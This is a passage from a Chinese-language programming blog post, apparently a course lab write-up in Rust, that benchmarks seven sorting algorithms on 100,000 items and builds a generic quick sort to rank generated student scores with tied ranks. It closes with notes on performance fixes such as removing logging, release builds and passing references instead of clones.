number">261739</span><span class="token number">2025</span>-12-22T05:01:27.364474Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">7</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">100000</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token builtin class-name">test</span> test::test_sort has been running <span class="token keyword">for</span> over <span class="token number">60</span> seconds<span class="token number">2025</span>-12-22T05:03:33.557852Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">2489615146</span> <span class="token operator">|</span> 移动: <span class="token number">2489515158</span><span class="token number">2025</span>-12-22T05:03:47.811176Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较: <span class="token number">323937261</span> <span class="token operator">|</span> 移动: <span class="token number">323537347</span><span class="token number">2025</span>-12-22T05:11:05.291893Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">4999918875</span> <span class="token operator">|</span> 移动: <span class="token number">7467497442</span><span class="token number">2025</span>-12-22T05:13:36.252963Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">4999950000</span> <span class="token operator">|</span> 移动:  <span class="token number">299970</span><span class="token number">2025</span>-12-22T05:13:36.433015Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较: <span class="token number">3019688</span> <span class="token operator">|</span> 移动: <span class="token number">4725597</span><span class="token number">2025</span>-12-22T05:13:36.563771Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较: <span class="token number">1994351</span> <span class="token operator">|</span> 移动: <span class="token number">2669799</span><span class="token number">2025</span>-12-22T05:13:36.738450Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较: <span class="token number">1536095</span> <span class="token operator">|</span> 移动: <span class="token number">3282766</span><span class="token builtin class-name">test</span> test::test_sort <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> test::test_sort <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">736</span>.95s     Running unittests src<span class="token punctuation">\</span>main.rs <span class="token punctuation">(</span>target<span class="token punctuation">\</span>debug<span class="token punctuation">\</span>deps<span class="token punctuation">\</span>ex7-c62cfa010482da9d.exe<span class="token punctuation">)</span>running <span class="token number">0</span> tests<span class="token builtin class-name">test</span> result: ok. <span class="token number">0</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s   Doc-tests ex7running <span class="token number">0</span> tests<span class="token builtin class-name">test</span> result: ok. <span class="token number">0</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>对于最后一组，十万数据的排序测试，冒泡排序跑了7分多钟，居然这么慢，插入排序和选择排序跑了两分多钟</p><p>shell排序因为步长很短，效果并不好，但是可以优化</p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>一道排序算法模板题，但是没有标准库可用，同时要求输出时附带名次且同分同名</p><p>既然测试的结果快排最好，那接下来就在快排的基础上改，首先把它变成一个泛型函数：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">quick_sort</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token keyword">where</span>    <span class="token class-name">T</span> <span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> high <span class="token operator">></span> low <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> pi <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> pi <span class="token operator">></span> low <span class="token punctuation">&#123;</span> <span class="token comment">// 避免pi = 0发生溢出的情况</span>            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> pi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> pi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">partition</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token keyword">where</span>    <span class="token class-name">T</span> <span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token operator">=</span> low <span class="token punctuation">;</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> low<span class="token punctuation">..</span>high <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>pivot<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>    index<span class="token punctuation">&#125;</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1 <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span> num2 <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    num1 <span class="token operator">></span> num2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>compare函数的比较对象并没有写成引用，这导致每次调用compare会移交所有权，而循环在继续，所以不得不.clone()，但这又会造成不必要的开销。i32类型时没有所有权问题是因为i32具有copy特征，其表示按位复制，当实现了copy特征后传参就会变成按位复制而非移动所有权。如果我传入一个指针，它会在函数结束被free掉，在自己的生命周期结束再被free，显然rust不会允许这种事情发生。涉及堆的、文件句柄、连接等的数据都无法实现copy特征</p><p>按理说compare的参数应当是引用，这是最标准的写法，这里为避免大面积修改clone了事了</p><p>接下来是Student结构体的实现，单独划分出一个字段记录名次，同时实现必要的特征<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Debug, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Student</span><span class="token punctuation">&#123;</span>    id <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    math <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>    chinese <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>    english <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>    order <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>id <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span> name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> math <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> chinese <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> english <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span><span class="token punctuation">&#123;</span>        <span class="token keyword">Self</span><span class="token punctuation">&#123;</span>            id<span class="token punctuation">,</span>            name<span class="token punctuation">,</span>            math<span class="token punctuation">,</span>            chinese<span class="token punctuation">,</span>            english<span class="token punctuation">,</span>            order <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Display</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">fmt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> f<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Formatter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Result</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>        <span class="token macro property">write!</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token string">"学号：&#123;&#125;, 姓名：&#123;&#125; 总分:&#123;&#125;, 语文：&#123;&#125; 数学：&#123;&#125;英语：&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>total<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>chinese<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>math<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>        <span class="token keyword">let</span> t2 <span class="token operator">=</span> other<span class="token punctuation">.</span>math <span class="token operator">+</span> other<span class="token punctuation">.</span>chinese <span class="token operator">+</span> other<span class="token punctuation">.</span>english<span class="token punctuation">;</span>        t1 <span class="token operator">==</span> t2    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>        <span class="token keyword">let</span> t2 <span class="token operator">=</span> other<span class="token punctuation">.</span>math <span class="token operator">+</span> other<span class="token punctuation">.</span>chinese <span class="token operator">+</span> other<span class="token punctuation">.</span>english<span class="token punctuation">;</span>        t1<span class="token punctuation">.</span><span class="token function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>t2<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>然后是核心的排序输出：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">sort</span><span class="token punctuation">(</span><span class="token keyword">mut</span> s <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Student</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> sort_instance <span class="token operator">=</span> <span class="token class-name">Sort</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sort_instance<span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current_score <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current_order <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> order <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>        <span class="token keyword">let</span> score <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>math <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token operator">=</span> order<span class="token punctuation">;</span>        <span class="token keyword">if</span> current_score <span class="token operator">==</span> score <span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> current_order<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            current_order <span class="token operator">=</span> index<span class="token punctuation">;</span>            current_score <span class="token operator">=</span> score<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"第&#123;&#125;名，&#123;&#125;"</span><span class="token punctuation">,</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这个名次处理感觉实现得笨笨的;总分应该单独维护一个字段的。倒序遍历列表输出，测试：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> _ <span class="token operator">=</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span></span><span class="token function">fmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">with_max_level</span><span class="token punctuation">(</span><span class="token class-name">LevelFilter</span><span class="token punctuation">::</span><span class="token constant">INFO</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">with_test_writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">try_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> data <span class="token operator">=</span> <span class="token function">generate_test_data</span><span class="token punctuation">(</span><span class="token number">100_00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Student</span><span class="token punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">generate_test_data</span><span class="token punctuation">(</span>count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Student</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 预分配内存，避免 vector 扩容带来的性能损耗</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> rng <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> students <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">with_capacity</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>count <span class="token punctuation">&#123;</span>        students<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>            i <span class="token keyword">as</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>            <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"Student_&#123;&#125;"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span>            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 数学</span>            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 语文</span>            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 英语</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    students<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出belike:<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2025</span>-12-23T07:29:15.759951Z  INFO ex7: 第99989名，学号：42516, 姓名：Student_42516 总分:7, 语文：2 数学：1英语：4<span class="token number">2025</span>-12-23T07:29:15.760054Z  INFO ex7: 第99989名，学号：65695, 姓名：Student_65695 总分:7, 语文：1 数学：1英语：5<span class="token number">2025</span>-12-23T07:29:15.760159Z  INFO ex7: 第99992名，学号：41828, 姓名：Student_41828 总分:6, 语文：6 数学：0英语：0<span class="token number">2025</span>-12-23T07:29:15.760265Z  INFO ex7: 第99992名，学号：93845, 姓名：Student_93845 总分:6, 语文：4 数学：2英语：0<span class="token number">2025</span>-12-23T07:29:15.760370Z  INFO ex7: 第99992名，学号：99254, 姓名：Student_99254 总分:6, 语文：3 数学：2英语：1<span class="token number">2025</span>-12-23T07:29:15.760447Z  INFO ex7: 第99995名，学号：88285, 姓名：Student_88285 总分:5, 语文：1 数学：3英语：1<span class="token number">2025</span>-12-23T07:29:15.760566Z  INFO ex7: 第99996名，学号：78260, 姓名：Student_78260 总分:4, 语文：1 数学：3英语：0<span class="token number">2025</span>-12-23T07:29:15.760702Z  INFO ex7: 第99996名，学号：69322, 姓名：Student_69322 总分:4, 语文：2 数学：0英语：2<span class="token number">2025</span>-12-23T07:29:15.760823Z  INFO ex7: 第99998名，学号：38750, 姓名：Student_38750 总分:3, 语文：2 数学：0英语：1<span class="token number">2025</span>-12-23T07:29:15.760930Z  INFO ex7: 第99999名，学号：14388, 姓名：Student_14388 总分:2, 语文：0 数学：1英语：1<span class="token number">2025</span>-12-23T07:29:15.761039Z  INFO ex7: 第99999名，学号：96388, 姓名：Student_96388 总分:2, 语文：0 数学：2英语：0<span class="token builtin class-name">test</span> test::test_2 <span class="token punctuation">..</span>. ok<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">21</span>.45s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="简单优化一下"><a href="#简单优化一下" class="headerlink" title="简单优化一下"></a>简单优化一下</h3><p>十万条学生数据的测试结果是21秒，然而实验1里只用了不到2毫秒，着实奇怪</p><p>首先去掉了日志输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">4</span>.80s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>提升明显，但还差着数量级</p><p>然后加大编译优化<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cargo</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">--release</span> -- <span class="token parameter variable">--nocapture</span><span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">3</span>.06s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p>没有解决问题，首先的怀疑对象肯定是每次比较clone（心虚），那就把compare的参数改成引用吧<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> num2<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token 